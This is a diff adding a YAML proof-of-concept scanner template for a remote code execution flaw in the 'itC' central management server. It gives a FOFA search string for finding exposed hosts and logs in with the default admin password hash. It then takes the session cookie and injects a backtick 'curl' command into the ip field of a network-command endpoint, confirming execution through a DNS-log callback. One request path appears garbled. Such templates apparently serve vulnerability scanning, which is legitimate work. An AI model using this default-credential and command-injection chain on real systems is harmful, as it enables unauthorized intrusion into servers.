@@ -1,0 +1,29 @@
+id: poc-yaml-itc-central-management-server-rce
+info:
+  name: itC 中心管理服务器 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  - DNSLOG
+  finger: itC 中心管理服务器
+  fofa: body="/mt_res_v3/img/public/logo.ico"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /frame/actionLogin.do
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: account=admin&password=21232f297a57a5a743894a0e4a801fc3&language=zh_CN
+  expression: status_code == 200 && body == "0"
+  output:
+  - regex_match(headers,"JSESSIONID=(?P<cookie>.*?);")
+- method: POST
+  path: /system/actionNetworkCmd.doctionLogin.do
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    Cookie: JSESSIONID={{.cookie}}
+  data: type=0&ip=127.0.0.1`curl {{.domain}}`&time=5&port=
+  expression: status_code == 200 && body == "0" && reverse.Verify()
+transport: http
